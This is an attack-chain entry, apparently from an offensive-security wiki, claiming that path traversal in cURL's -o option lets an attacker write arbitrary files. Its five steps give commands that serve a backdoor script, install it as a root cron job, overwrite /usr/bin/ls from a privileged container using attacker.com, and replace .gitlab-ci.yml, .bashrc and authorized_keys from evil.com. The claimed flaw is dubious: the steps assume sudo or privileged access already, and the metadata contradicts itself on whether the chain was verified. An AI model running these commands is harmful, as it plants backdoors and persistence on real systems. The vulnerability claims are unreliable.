---
tags:
  - path-traversal
  - arbitrary-file-write
  - curl
  - rce
  - persistence
  - privilege-escalation
  - supply-chain
type: attack_chain
tools:
  - '[[tools/cURL]]'
  - '[[tools/Python]]'
  - '[[tools/Docker]]'
tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Linux
  - macOS
  - Docker
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Host-Malicious-Payload-with-Python-Server]]'
  - '[[procedures/Exploit-cURL-Path-Traversal-for-Cron-Backdoor]]'
  - '[[procedures/Verify-Arbitrary-File-Write-Success]]'
  - '[[procedures/Overwrite-System-Binary-in-Privileged-Docker-Container]]'
  - '[[procedures/Inject-Malicious-Config-in-CI-CD-Pipeline-via-cURL]]'
  - '[[procedures/Achieve-User-Persistence-with-cURL-File-Writes]]'
step_count: 5
techniques:
  - '[[Cron]]'
  - '[[Change Default File Association]]'
  - '[[Account Manipulation]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:26:12.490Z'
description: >-
  Multi-stage attack exploiting path traversal in cURL's -o parameter to achieve
  arbitrary file writes, enabling privilege escalation, remote code execution,
  and persistence across user, container, and CI/CD environments.
skill_level: intermediate
impact_level: high
id: 55ab4742-ff81-4b93-b752-7bc87d477239
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Persistence]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Cron]]'
  - '[[Change Default File Association]]'
  - '[[Account Manipulation]]'
  - '[[Exploitation for Client Execution]]'
---
# Arbitrary File Write via Path Traversal in cURL Output Parameter Leading to RCE and Persistence

Multi-stage attack chain exploiting the lack of path sanitization in cURL's -o/--output parameter (in src/tool_cfgable.c), allowing relative path traversal (e.g., ../../) to write files outside the intended directory. This enables overwriting sensitive files for privilege escalation (e.g., cron jobs), remote code execution in containers or pipelines, and user-level persistence. Discovered via source code review showing no realpath() normalization, affecting cURL versions 7.64.0 to 8.4.0.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Host Malicious Payload] --> B[Exploit Path Traversal for File Write]
    B --> C[Verify and Escalate Privileges]
    C --> D[Container or Pipeline Exploitation]
    D --> E[Persistence and Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Python]]
- [[tools/cURL]]
- [[tools/Docker]]

### Target Environment

- Linux (Debian-based) or macOS with cURL installed (versions 7.64.0-8.4.0)
- Privileged access for escalation demos (e.g., sudo)
- Docker for container exploitation
- Network access to host server on port 8000

### Initial Access Requirements

- Local or remote shell access to run cURL commands
- Ability to run with elevated privileges (sudo) for system file overwrites
- Attacker-controlled server for hosting payloads

## Detailed Attack Procedures

### Step 1: Host Malicious Payload
procedure: [[procedures/Host-Malicious-Payload-with-Python-Server]]

**Objective**: Set up a local web server to serve a malicious backdoor script for download during exploitation.

**Instructions**: Use [[commands/python3-http-server]] to start a simple HTTP server in the directory containing the backdoor.sh file.

```bash
python3 -m http.server 8000
```

**Expected Output**: Server startup message like "Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ..."

**Success Indicators**:
- Server listening on port 8000
- backdoor.sh accessible via http://localhost:8000/backdoor.sh

### Step 2: Exploit Path Traversal for Cron Backdoor
procedure: [[procedures/Exploit-cURL-Path-Traversal-for-Cron-Backdoor]]

**Objective**: Use cURL with sudo to download and write the backdoor to a system cron directory, enabling root RCE on the next cron run.

**Instructions**: Execute [[commands/sudo-curl-cron-backdoor]] from a directory where traversal can reach /etc/cron.daily/.

```bash
sudo curl http://localhost:8000/backdoor.sh -o "../../etc/cron.daily/zzz-backdoor"
```

**Expected Output**: Silent success; file written to /etc/cron.daily/zzz-backdoor.

**Success Indicators**:
- Backdoor file created with root ownership
- Cron executes it periodically with elevated privileges

### Step 3: Verify Arbitrary File Write
procedure: [[procedures/Verify-Arbitrary-File-Write-Success]]

**Objective**: Confirm the malicious file was written correctly and inspect its contents.

**Instructions**: Run [[commands/ls-cron-backdoor]] to check file details, followed by [[commands/cat-cron-backdoor]] to view contents.

```bash
ls -l /etc/cron.daily/zzz-backdoor
cat /etc/cron.daily/zzz-backdoor
```

**Expected Output**: Long listing showing root ownership (e.g., "-rw-r--r-- 1 root root 123 May 1 06:30 /etc/cron.daily/zzz-backdoor") and script contents.

**Success Indicators**:
- File exists with correct permissions and owner
- Contents match the hosted backdoor.sh

### Step 4: Overwrite System Binary in Privileged Container
procedure: [[procedures/Overwrite-System-Binary-in-Privileged-Docker-Container]]

**Objective**: Demonstrate RCE by overwriting a host-accessible binary inside a privileged Docker container.

**Instructions**: Launch a privileged Alpine container and run [[commands/docker-curl-binary-overwrite]] inside it.

```bash
docker run --privileged alpine sh -c 'curl http://attacker.com/x.sh -o /usr/bin/ls'
```

**Expected Output**: Container executes; /usr/bin/ls overwritten with malicious script.

**Success Indicators**:
- Binary replaced on host (due to --privileged)
- Subsequent 'ls' runs execute the backdoor

### Step 5: Inject into CI/CD and User Persistence
procedure: [[procedures/Inject-Malicious-Config-in-CI-CD-Pipeline-via-cURL]]
procedure: [[procedures/Achieve-User-Persistence-with-cURL-File-Writes]]

**Objective**: Extend exploitation to supply chain injection in CI/CD and user-level persistence via config files.

**Instructions**: For CI/CD, use [[commands/curl-gitlab-ci-overwrite]] in a pipeline script:

```bash
curl http://evil.com/ -o "../../.gitlab-ci.yml"
```

For persistence, run [[commands/curl-bashrc-overwrite]] and [[commands/curl-authorized-keys-overwrite]]:

```bash
curl http://evil.com/ -o "~/.bashrc"
curl http://evil.com/key.pub -o "~/.ssh/authorized_keys"
```

**Expected Output**: Config files overwritten; malicious code executes on login or pipeline run.

**Success Indicators**:
- .gitlab-ci.yml contains injected payload
- .bashrc executes on shell start; SSH key added for unauthorized access

## Attack Chain Summary

### Key Achievements

1. Arbitrary file write bypassing directory restrictions via ../ traversal in cURL -o.
2. Privilege escalation to root through cron job injection.
3. RCE in containerized environments by overwriting system binaries.
4. Supply chain compromise in CI/CD via config overwrites.
5. User persistence and lateral movement via shell/SSH configs.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Cron]] Scheduled Task/Job: Cron
- [[Change Default File Association]] Event Triggered Execution: Change Default File Association
- [[Account Manipulation]] Account Manipulation: Add Account
- [[Exploitation for Client Execution]] Exploitation for Client Execution

### MITRE ATT&CK Tactics

- [[Execution]] Execution
- [[Persistence]] Persistence
- [[Privilege Escalation]] Privilege Escalation

---
*Last updated: 2023-10-01T00:00:00Z*
